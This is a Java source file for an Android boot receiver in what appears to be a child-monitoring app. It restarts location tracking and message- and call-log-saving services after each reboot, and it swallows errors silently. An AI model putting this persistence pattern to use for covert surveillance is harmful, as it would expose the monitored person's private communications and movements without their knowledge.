package com.softvilla.childapp;

import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Handler;

/**
 * Created by Hassan on 11/30/2017.
 */

public class BootReceiver extends BroadcastReceiver {
    Handler handler;
    @Override
    public void onReceive(final Context context, Intent intent) {
        handler = new Handler();

        handler.postDelayed(new Runnable() {

            @Override
            public void run() {
                try {
                    context.startService(new Intent(context,TrackingService.class));
                    if(haveNetworkConnection(context)){
                        context.startService(new Intent(context,SavingMessagesService.class));
                        context.startService(new Intent(context,SavingCallLogsService.class));
                        //context.startService(new Intent(context,SavingContactsService.class));
                    }

                }
                catch (Exception e){
                    //Toast.makeText(context, e.toString(), Toast.LENGTH_SHORT).show();
                }
            }
        }, 200);

    }

    private boolean isMyServiceRunning(Class<?> serviceClass,Context context) {
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    private boolean haveNetworkConnection(Context context) {
        boolean haveConnectedWifi = false;
        boolean haveConnectedMobile = false;

        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo[] netInfo = cm.getAllNetworkInfo();
        for (NetworkInfo ni : netInfo) {
            if (ni.getTypeName().equalsIgnoreCase("WIFI"))
                if (ni.isConnected())
                    haveConnectedWifi = true;
            if (ni.getTypeName().equalsIgnoreCase("MOBILE"))
                if (ni.isConnected())
                    haveConnectedMobile = true;
        }
        return haveConnectedWifi || haveConnectedMobile;
    }
}
